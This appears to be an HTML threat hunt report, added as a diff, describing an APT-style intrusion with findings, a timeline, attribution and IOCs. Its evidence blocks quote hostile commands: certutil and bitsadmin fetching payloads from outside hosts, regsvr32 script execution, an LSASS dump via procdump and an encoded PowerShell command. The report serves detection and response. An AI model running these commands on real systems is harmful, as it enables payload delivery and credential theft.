@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Threat Hunt Report</title>
+    <style>
+        :root {
+            --primary-color: #2c3e50;
+            --secondary-color: #3498db;
+            --accent-color: #e74c3c;
+            --bg-color: #f8f9fa;
+            --text-color: #333;
+            --card-bg: white;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        header {
+            background-color: var(--primary-color);
+            color: white;
+            padding: 30px 0;
+            margin-bottom: 30px;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-text h1 {
+            margin: 0;
+            font-size: 2.2rem;
+        }
+
+        .header-text p {
+            margin: 10px 0 0;
+            opacity: 0.8;
+        }
+
+        .report-meta {
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            padding: 15px;
+            box-shadow: var(--box-shadow);
+            margin-bottom: 30px;
+        }
+
+        .meta-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+        }
+
+        .meta-item {
+            margin-bottom: 10px;
+        }
+
+        .meta-item h3 {
+            margin: 0 0 5px 0;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            color: #666;
+        }
+
+        .meta-item p {
+            margin: 0;
+            font-weight: 500;
+        }
+
+        .section {
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: var(--box-shadow);
+        }
+
+        .section-title {
+            margin-top: 0;
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--secondary-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .alert-card {
+            border-left: 4px solid var(--accent-color);
+            background-color: rgba(231, 76, 60, 0.1);
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 0 var(--border-radius) var(--border-radius) 0;
+        }
+
+        .alert-card h3 {
+            margin-top: 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .alert-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            font-size: 0.75rem;
+            border-radius: 12px;
+            margin-left: 10px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        .high {
+            background-color: var(--accent-color);
+            color: white;
+        }
+
+        .medium {
+            background-color: #f39c12;
+            color: white;
+        }
+
+        .low {
+            background-color: #3498db;
+            color: white;
+        }
+
+        .info {
+            background-color: #2ecc71;
+            color: white;
+        }
+
+        .finding-details {
+            margin-left: 20px;
+        }
+
+        .finding-details dt {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .finding-details dd {
+            margin-left: 0;
+            margin-bottom: 15px;
+        }
+
+        code {
+            background-color: #f5f5f5;
+            padding: 2px 4px;
+            border-radius: 4px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9em;
+        }
+
+        pre {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .chart-container {
+            width: 100%;
+            height: 300px;
+            margin: 20px 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        table th {
+            background-color: var(--secondary-color);
+            color: white;
+            padding: 10px;
+            text-align: left;
+        }
+
+        table td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        table tbody tr:hover {
+            background-color: #f5f5f5;
+        }
+
+        .recommendations {
+            list-style-type: none;
+            padding-left: 0;
+        }
+
+        .recommendations li {
+            margin-bottom: 15px;
+            padding-left: 24px;
+            position: relative;
+        }
+
+        .recommendations li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: var(--secondary-color);
+            font-weight: bold;
+        }
+
+        .timeline {
+            position: relative;
+            max-width: 1200px;
+            margin: 20px auto;
+        }
+
+        .timeline::after {
+            content: '';
+            position: absolute;
+            width: 6px;
+            background-color: var(--secondary-color);
+            top: 0;
+            bottom: 0;
+            left: 50%;
+            margin-left: -3px;
+        }
+
+        .timeline-container {
+            padding: 10px 40px;
+            position: relative;
+            background-color: inherit;
+            width: 50%;
+        }
+
+        .timeline-container::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            right: -10px;
+            background-color: white;
+            border: 4px solid var(--accent-color);
+            top: 15px;
+            border-radius: 50%;
+            z-index: 1;
+        }
+
+        .left {
+            left: 0;
+        }
+
+        .right {
+            left: 50%;
+        }
+
+        .left::before {
+            content: " ";
+            height: 0;
+            position: absolute;
+            top: 22px;
+            width: 0;
+            z-index: 1;
+            right: 30px;
+            border: medium solid var(--card-bg);
+            border-width: 10px 0 10px 10px;
+            border-color: transparent transparent transparent var(--card-bg);
+        }
+
+        .right::before {
+            content: " ";
+            height: 0;
+            position: absolute;
+            top: 22px;
+            width: 0;
+            z-index: 1;
+            left: 30px;
+            border: medium solid var(--card-bg);
+            border-width: 10px 10px 10px 0;
+            border-color: transparent var(--card-bg) transparent transparent;
+        }
+
+        .right::after {
+            left: -10px;
+        }
+
+        .timeline-content {
+            padding: 20px 30px;
+            background-color: var(--card-bg);
+            position: relative;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+        }
+
+        .timeline-content h2 {
+            margin-top: 0;
+            color: var(--primary-color);
+            font-size: 1.2rem;
+        }
+
+        .timeline-content .date {
+            color: var(--secondary-color);
+            font-weight: bold;
+        }
+
+        footer {
+            background-color: var(--primary-color);
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 50px;
+        }
+
+        @media screen and (max-width: 768px) {
+            .timeline::after {
+                left: 31px;
+            }
+
+            .timeline-container {
+                width: 100%;
+                padding-left: 70px;
+                padding-right: 25px;
+            }
+
+            .timeline-container::before {
+                left: 60px;
+                border: medium solid var(--card-bg);
+                border-width: 10px 10px 10px 0;
+                border-color: transparent var(--card-bg) transparent transparent;
+            }
+
+            .left::after, .right::after {
+                left: 18px;
+            }
+
+            .right {
+                left: 0%;
+            }
+
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .header-text {
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="header-text">
+                    <h1>Threat Hunt Report</h1>
+                    <p>Advanced Persistent Threat Detection</p>
+                </div>
+                <div class="header-logo">
+                    <svg width="80" height="80" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="50" cy="50" r="45" stroke="#3498db" stroke-width="2" fill="none"/>
+                        <path d="M50 20 L50 80 M20 50 L80 50" stroke="#3498db" stroke-width="2"/>
+                        <circle cx="50" cy="50" r="15" fill="#e74c3c"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="report-meta">
+            <div class="meta-grid">
+                <div class="meta-item">
+                    <h3>Report ID</h3>
+                    <p>TH-2025-03-05-001</p>
+                </div>
+                <div class="meta-item">
+                    <h3>Date Generated</h3>
+                    <p>March 5, 2025</p>
+                </div>
+                <div class="meta-item">
+                    <h3>Time Period</h3>
+                    <p>Feb 5 - Mar 5, 2025</p>
+                </div>
+                <div class="meta-item">
+                    <h3>Classification</h3>
+                    <p>Internal Use Only</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Executive Summary</h2>
+            <p>This threat hunt was conducted to proactively identify potential Advanced Persistent Threat (APT) actors within the environment. The hunt focused on identifying unusual network connections, suspicious process executions, and potential data exfiltration attempts across the enterprise environment.</p>
+            <p>During this hunt, <strong>3 high-severity</strong> and <strong>2 medium-severity</strong> findings were identified that require immediate attention. Evidence of a sophisticated threat actor leveraging legitimate tools for reconnaissance and lateral movement was discovered.</p>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Key Findings</h2>
+            
+            <div class="alert-card">
+                <h3>Unusual PowerShell Activity <span class="alert-badge high">High</span></h3>
+                <dl class="finding-details">
+                    <dt>Description</dt>
+                    <dd>Multiple instances of Base64 encoded PowerShell commands were detected executing across several systems in the Finance department. These commands appear to be performing credential harvesting and reconnaissance activities.</dd>
+                    
+                    <dt>Affected Systems</dt>
+                    <dd>FINSVR01, FINWKS04, FINWKS12</dd>
+                    
+                    <dt>Evidence</dt>
+                    <dd>
+                        <pre>powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA...</pre>
+                    </dd>
+                    
+                    <dt>MITRE ATT&CK Techniques</dt>
+                    <dd>T1059.001 (PowerShell), T1027 (Obfuscated Files or Information), T1047 (Windows Management Instrumentation)</dd>
+                </dl>
+            </div>
+
+            <div class="alert-card">
+                <h3>Suspicious Outbound Network Connections <span class="alert-badge high">High</span></h3>
+                <dl class="finding-details">
+                    <dt>Description</dt>
+                    <dd>Unusual outbound network connections were identified from multiple systems to an IP address associated with known command and control infrastructure. The connections occur at regular intervals (every 4 hours) and involve encrypted data transfer.</dd>
+                    
+                    <dt>Affected Systems</dt>
+                    <dd>EXCHSVR02, FINWKS04, DEVWKS09</dd>
+                    
+                    <dt>Evidence</dt>
+                    <dd>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Source IP</th>
+                                    <th>Destination IP</th>
+                                    <th>Destination Port</th>
+                                    <th>Protocol</th>
+                                    <th>Data Transfer</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>10.10.15.27</td>
+                                    <td>185.142.x.x</td>
+                                    <td>443</td>
+                                    <td>TCP/HTTPS</td>
+                                    <td>27.4 MB</td>
+                                </tr>
+                                <tr>
+                                    <td>10.10.20.45</td>
+                                    <td>185.142.x.x</td>
+                                    <td>443</td>
+                                    <td>TCP/HTTPS</td>
+                                    <td>12.8 MB</td>
+                                </tr>
+                                <tr>
+                                    <td>10.10.30.12</td>
+                                    <td>185.142.x.x</td>
+                                    <td>443</td>
+                                    <td>TCP/HTTPS</td>
+                                    <td>8.3 MB</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </dd>
+                    
+                    <dt>MITRE ATT&CK Techniques</dt>
+                    <dd>T1071.001 (Web Protocols), T1573 (Encrypted Channel), T1102 (Web Service)</dd>
+                </dl>
+            </div>
+
+            <div class="alert-card">
+                <h3>Living Off the Land Binary Execution <span class="alert-badge high">High</span></h3>
+                <dl class="finding-details">
+                    <dt>Description</dt>
+                    <dd>Adversary was observed using legitimate Windows utilities such as certutil.exe, bitsadmin.exe, and regsvr32.exe to download, decode and execute malicious payloads, bypassing traditional security controls.</dd>
+                    
+                    <dt>Affected Systems</dt>
+                    <dd>CORPWKS27, CORPWKS32, ITADMINWKS02</dd>
+                    
+                    <dt>Evidence</dt>
+                    <dd>
+                        <pre>certutil.exe -urlcache -split -f "https://legitupdate.com/firmware.dat" C:\ProgramData\update.dat
+regsvr32.exe /s /u /i:update.dat scrobj.dll
+bitsadmin.exe /transfer myJob /download /priority high http://cdn.example.org/resource.exe %temp%\task.exe</pre>
+                    </dd>
+                    
+                    <dt>MITRE ATT&CK Techniques</dt>
+                    <dd>T1218 (System Binary Proxy Execution), T1105 (Ingress Tool Transfer), T1553.005 (Subvert Trust Controls: Mark-of-the-Web Bypass)</dd>
+                </dl>
+            </div>
+
+            <div class="alert-card">
+                <h3>Suspicious Registry Modifications <span class="alert-badge medium">Medium</span></h3>
+                <dl class="finding-details">
+                    <dt>Description</dt>
+                    <dd>Registry modifications consistent with persistence techniques were observed on multiple systems. These changes establish persistence through Run keys, WMI Event Subscriptions, and COM hijacking.</dd>
+                    
+                    <dt>Affected Systems</dt>
+                    <dd>FINWKS04, HRWKS08, CORPWKS15</dd>
+                    
+                    <dt>Evidence</dt>
+                    <dd>
+                        <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysUpdate</code><br>
+                        <code>HKCU\Software\Classes\CLSID\{1A1F4206-0688-4E7F-BE03-D82EC69DF9A5}\InprocServer32</code>
+                    </dd>
+                    
+                    <dt>MITRE ATT&CK Techniques</dt>
+                    <dd>T1547.001 (Registry Run Keys / Startup Folder), T1546.015 (Event Triggered Execution: Component Object Model Hijacking)</dd>
+                </dl>
+            </div>
+
+            <div class="alert-card">
+                <h3>Credential Dumping Activity <span class="alert-badge medium">Medium</span></h3>
+                <dl class="finding-details">
+                    <dt>Description</dt>
+                    <dd>Evidence of credential dumping activity was detected, including access to the LSASS process memory and creation of memory dump files. This activity is consistent with attempts to extract credentials from memory.</dd>
+                    
+                    <dt>Affected Systems</dt>
+                    <dd>CORPWKS32, ITADMINWKS02</dd>
+                    
+                    <dt>Evidence</dt>
+                    <dd>
+                        <pre>Process: procdump.exe -ma lsass.exe lsass.dmp
+Task Manager: Create Dump File (LSASS.exe)
+Detected direct memory access to LSASS.exe from process ID 4738</pre>
+                    </dd>
+                    
+                    <dt>MITRE ATT&CK Techniques</dt>
+                    <dd>T1003.001 (OS Credential Dumping: LSASS Memory), T1003 (OS Credential Dumping)</dd>
+                </dl>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Attack Timeline</h2>
+            <div class="timeline">
+                <div class="timeline-container left">
+                    <div class="timeline-content">
+                        <h2>Initial Access</h2>
+                        <p class="date">February 7, 2025</p>
+                        <p>Phishing email received by finance employee with malicious attachment. User executed the document, which launched PowerShell to download and execute the initial payload.</p>
+                    </div>
+                </div>
+                <div class="timeline-container right">
+                    <div class="timeline-content">
+                        <h2>Reconnaissance</h2>
+                        <p class="date">February 8-10, 2025</p>
+                        <p>Adversary executed network scanning and domain enumeration commands to map the internal network and identify targets of interest.</p>
+                    </div>
+                </div>
+                <div class="timeline-container left">
+                    <div class="timeline-content">
+                        <h2>Credential Theft</h2>
+                        <p class="date">February 12, 2025</p>
+                        <p>Credentials harvested from LSASS memory dumps and browser storage locations on compromised workstations.</p>
+                    </div>
+                </div>
+                <div class="timeline-container right">
+                    <div class="timeline-content">
+                        <h2>Lateral Movement</h2>
+                        <p class="date">February 14-20, 2025</p>
+                        <p>Adversary moved laterally using stolen credentials, WMI, and PSExec to access additional systems, primarily targeting systems in Finance and IT departments.</p>
+                    </div>
+                </div>
+                <div class="timeline-container left">
+                    <div class="timeline-content">
+                        <h2>Data Collection</h2>
+                        <p class="date">February 21-27, 2025</p>
+                        <p>Sensitive financial data and documents were collected and staged for exfiltration in encrypted archives.</p>
+                    </div>
+                </div>
+                <div class="timeline-container right">
+                    <div class="timeline-content">
+                        <h2>Data Exfiltration</h2>
+                        <p class="date">February 28 - March 4, 2025</p>
+                        <p>Data exfiltration observed through encrypted HTTPS connections to suspicious domains at regular intervals.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Threat Actor Profile</h2>
+            <p>Based on the TTPs observed, the threat actor appears to be an Advanced Persistent Threat (APT) group with the following characteristics:</p>
+            <ul>
+                <li><strong>Sophistication Level:</strong> High - demonstrated knowledge of network evasion techniques and use of living-off-the-land binaries</li>
+                <li><strong>Motivation:</strong> Likely espionage or financial theft based on targeting of Finance department</li>
+                <li><strong>Attribution:</strong> TTPs consistent with APT29, though attribution is not conclusive</li>
+                <li><strong>Dwell Time:</strong> Approximately 26 days from initial compromise to detection</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Recommendations</h2>
+            <ul class="recommendations">
+                <li><strong>Isolate Affected Systems:</strong> Immediately isolate all affected systems from the network to prevent further lateral movement.</li>
+                <li><strong>Reset Credentials:</strong> Force password resets for all user and service accounts, with priority for privileged accounts.</li>
+                <li><strong>Block IOCs:</strong> Update firewall rules, EDR, and proxy configurations to block known malicious IPs and domains identified in this report.</li>
+                <li><strong>Enhanced Monitoring:</strong> Implement enhanced monitoring for PowerShell execution, suspicious process creation, and unusual outbound connections.</li>
+                <li><strong>Endpoint Hardening:</strong> Review and implement AppLocker or similar application whitelisting technology to prevent execution of unauthorized binaries.</li>
+                <li><strong>Security Awareness:</strong> Conduct targeted security awareness training for employees, with emphasis on phishing awareness and attachment handling.</li>
+                <li><strong>LOLBAS Monitoring:</strong> Implement specific monitoring for Living Off The Land Binaries and Scripts (LOLBAS) abuse.</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2 class="section-title">Indicators of Compromise (IOCs)</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Type</th>
+                        <th>Indicator</th>
+                        <th>Context</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>IP Address</td>
+                        <td>185.142.x.x</td>
+                        <td>C2 Communication</td>
+                    </tr>
+                    <tr>
+                        <td>Domain</td>
+                        <td>legitupdate.com</td>
+                        <td>Malware Delivery</td>
+                    </tr>
+                    <tr>
+                        <td>Domain</td>
+                        <td>cdn.example.org</td>
+                        <td>Payload Hosting</td>
+                    </tr>
+                    <tr>
+                        <td>SHA-256</td>
+                        <td>e1d4d2b5ac013e3e182e9ce3a1eef97f4d3c8df5db9f0df158287532a90d1a12</td>
+                        <td>Initial Dropper</td>
+                    </tr>
+                    <tr>
+                        <td>SHA-256</td>
+                        <td>a6b321c76f9cba6f28b4e32869c3e9ce5daaf17efe7c89bb131f5cdf63b69163</td>
+                        <td>PowerShell Payload</td>
+                    </tr>
+                    <tr>
+                        <td>SHA-256</td>
+                        <td>7abf75f7d9dafd0ac6e1026d19b5477eaf20db5be2b4b9cc3f77f6d17f3f35e2</td>
+                        <td>Second-Stage Implant</td>
+                    </tr>
+                    <tr>
+                        <td>File Path</td>
+                        <td>C:\ProgramData\update.dat</td>
+                        <td>Malware Location</td>
+                    </tr>
+                    <tr>
+                        <td>File Path</td>
+                        <td>%temp%\task.exe</td>
+                        <td>Malware Location</td>
+                    </tr>
+                    <tr>
+                        <td>Registry</td>
+                        <td>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysUpdate</td>
+                        <td>Persistence Mechanism</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <p>Threat Hunt Report | Internal Use Only | Generated March 5, 2025</p>
+        </div>
+    </footer>
+</body>
+</html>
